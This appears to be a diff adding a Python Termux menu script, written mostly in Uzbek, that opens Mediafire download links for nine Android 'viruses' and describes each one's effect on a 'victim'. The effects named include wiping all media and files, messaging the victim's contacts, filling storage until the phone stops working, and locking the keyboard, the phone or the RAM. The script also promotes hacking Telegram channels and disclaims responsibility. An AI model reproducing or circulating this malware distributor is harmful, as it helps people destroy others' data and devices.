@@ -1,0 +1,99 @@
+import os, sys
+
+def clearscreen():
+	if sys.platform == "linux2":
+		os.system("clear")
+	elif sys.platform == "win32":
+		os.system("cls")
+	else:
+		os.system("clear")
+
+clearscreen()
+os.system("termux-open-url https://t.me/termux_private")
+
+darknet = input("""\033[1;35m
+┈██▒┈┈┈█▓┈██▓┈┈██▀███┈┈┈█┈┈┈┈██┈┈┈██████┈┈            
+▓██░┈┈┈█▒▓██▒┈▓██┈▒┈██▒┈██┈┈▓██▒▒██┈┈┈┈▒┈┈            
+┈▓██┈┈█▒░▒██▒┈▓██┈░▄█┈▒▓██┈┈▒██░░┈▓██▄┈┈┈┈            
+┈┈▒██┈█░░░██░┈▒██▀▀█▄┈┈▓▓█┈┈░██░┈┈▒┈┈┈██▒┈              
+┈┈┈▒▀█░┈┈░██░┈░██▓┈▒██▒▒▒█████▓┈▒██████▒▒┈            
+┈┈┈░┈▐░┈┈░▓┈┈┈░┈▒▓┈░▒▓░░▒▓▒┈▒┈▒┈▒┈▒▓▒┈▒┈░┈            
+┈┈┈░┈░░┈┈┈▒┈░┈┈┈░▒┈░┈▒░░░▒░┈░┈░┈░┈░▒┈┈░┈░┈            
+┈┈┈┈┈░░┈┈┈▒┈░┈┈┈░░┈┈┈░┈┈░░░┈░┈░┈░┈┈░┈┈░┈┈┈             
+┈┈┈┈┈┈░┈┈┈░┈┈┈┈┈┈░┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈░┈┈┈              
+┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈              
+			coded by @darknet_off1cial
+""" """\033[1;34m01➣ del file 
+02➣ clone files 
+03➣ elite 
+04➣ block claviatura 
+05➣ block telephone 
+06➣ virtuvalXposed
+07➣ sin telegram
+08➣ white theme 
+09➣ camera block
+00➣ script info """ "\033[1;33m\n11➣  " """\033[1;32mQuyidagi raqamlardan birini tanlang: """)
+if darknet == '1':
+		os.system("termux-open-url https://www.mediafire.com/file/pp4rhn6vax9zhx6/Instagram+followers.apk/file")
+		print("\033[1;31m\n➣DEL FILE - bu manimcha virus emas negaki bu dasturga kirgan zahotingiz hamma multimedia , rasmlar, videolar, fayllar, musiqalar delete bolib o'chib ketadi.. lekim fleshkadagi malumotlarga hechqanday ziyon keltirmaydi...")
+elif darknet == '3':
+	os.system("termux-open-url https://www.mediafire.com/file/5cz4nu3i4bfl8yb/Elite.zip/file")
+	print("\033[1;31m\n➣ELITE -  ushbu virus vazifasi \nqurbonning qurulmasiga ornatilgach \nyani qurbon uchbu virus vositani ornatgach \nqurulma xotirasidagi barcha \nmalumotlar o'chib ketadi va qurbonning\nkontaktlariga avtomatik tarzda ingliz tilida habar yubora boshlaydi....\nushbu virusni yuklab olish mumkun lekin o'rnatish xavfli....\nZip faylni ochsangiz apk fayl bor apk faylni qurulmangizga o'rnatmaganiz maqul !!! ")
+
+elif darknet == '2':
+	os.system("termux-open-url https://www.mediafire.com/file/mpgrohkjddsbo0n/Clone_files.zip/file")
+	print("\033[1;31m➣CLONE FILES - Buni telefoniga õrnatgan odamni \nTelefoni pamyat tolib ketadi \nshu darajada tõladiki telefon \njavob berishga ham holi qolmasligi mumkun va \ntelefon ishdan chiqishi mumkun \n\nFaqat ehtiyot bôling !! ")
+
+elif darknet == '4':
+	os.system("termux-open-url https://www.mediafire.com/file/uf89qjav3zdbxhm/notepad.apk/file")
+	print("\033[1;31m➣BLOCK CLAVIATURA - oddiy jiddiy zarar yetkazmaydigan claviatura qulflovchi virus. \nIshlatish uchun shunchaki dasturga \nkirib biron bir soz yozish kifoya \nagar oddiy odamga yuborilsa norm qo'rqitishi mumkun !! ")
+
+elif darknet == '5':
+	os.system("termux-open-url https://www.mediafire.com/file/zaaj6213aidt4da/Darknet.zip/file")
+	print("\033[1;31m➣BLOCK TELEPHONE - bu ham oddiy virus lekin ommabob koplar shunday viruslardsn foydalanadi. bu virus vazifasi qurulmalarni blocklash bu virus eskiroq yani versiasj pass bolgan qurulmalarga tushadi. codi: 01102005")
+	
+elif darknet == '6':
+	os.system("termux-open-url https://www.mediafire.com/file/hcnf13vmahybyhh/VirtualXposed.zip/file")
+	print("\033[1;31m➣VirtualXposed - bu virus unchslik zararli emas dasturga kirin registratsia tugmasini bosish kerak")
+
+elif darknet == '7':
+	os.system("termux-open-url https://www.mediafire.com/file/ll5hhcfwnwww5gy/Sin_Telegram.zip/file")
+	print("SIN TELEGRAM - bu virusga kirganizda tugmalar ishlamay qoladi va x ovozi baland ovozda ishlay boshlaydi")
+
+elif darknet == '8':
+	os.system("termux-open-url https://www.mediafire.com/file/6g0hx4h59i3rcrj/White.attheme/file")
+	print("""\033[1;31m➣WHITE THEME - bu virus emastelegram uchun tema \nlekin oddiy tema emas yani \nmultimedialardan boshqa hech narsa korinmaydi \nva oppoq korinishda boladi dostlariz bn \nhazil qilishingiz mumkun...!!!""")
+
+elif darknet == '9':
+	os.system("termux-open-url https://www.mediafire.com/file/ol9spgsww7h6nqj/Android.zip/file")
+	print("ANDROID - Bu Virus Dastur \nAgar u oʻrnatilsa OZU hotirani Muzlatib qoyadi \nPEREZAGRUZKA berilmaguncha Sizni asabiylashtiradi....")
+
+
+elif darknet == '0':
+	clearscreen()
+	print("""\033[1;32m
+██╗███╗░░██╗███████╗░█████╗░                   
+██║████╗░██║██╔════╝██╔══██╗            
+██║██╔██╗██║█████╗░░██║░░██║            
+██║██║╚████║██╔══╝░░██║░░██║             
+██║██║░╚███║██║░░░░░╚█████╔╝            
+╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░       
+	""" 
+"""\033[1;36m
+USHBU SCRIPTDA PRANK UCHUN VIRUSLAR BOR HOLOS
+HAQIQIY KOTTA VIRUSLAR JAVOBGARLIKKA TORTILADI
+USHBU SCRIPT ORQALi HAM JAVOBGARLIKKA TORTILISHINGIZ MUMKUN
+BU SIZGA BOGLIQ DASTURCHI BUNGA AYBDOR EMAS... 
+BU SCRIPTDA JAMI 9 XIL VIRUSLAR BOR
+
+""" """\033[1;34mBIZNING TELEGRAM KANALLARIMIZ      
+➣https://t.me/termux_private 
+➣https://t.me/magicbot_uz 
+➣https://t.me/darknet_off1cial  
+➣https://t.me/dn_uzbek 
+➣https://t.me/darknet7719 
+➣https://t.me/darknet_hacking_books 
+
+BIZNING TELEGRAM BOTIMIZ 
+➣https://t.me/magic_uz_bot 
+➣https://t.me/darknet_aloqa_bot """)
